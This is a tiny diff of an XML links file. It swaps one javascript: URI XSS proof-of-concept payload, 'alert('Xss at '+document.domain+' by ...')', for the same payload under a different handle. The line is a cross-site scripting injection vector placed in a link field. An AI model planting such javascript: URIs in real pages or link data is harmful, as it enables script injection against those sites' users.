@@ -1,3 +1,3 @@
 <links>
-<link uri="javascript:alert('Xss at '+document.domain+' by PhclownX')"/>
+<link uri="javascript:alert('Xss at '+document.domain+' by nmochea')"/>
 </links>
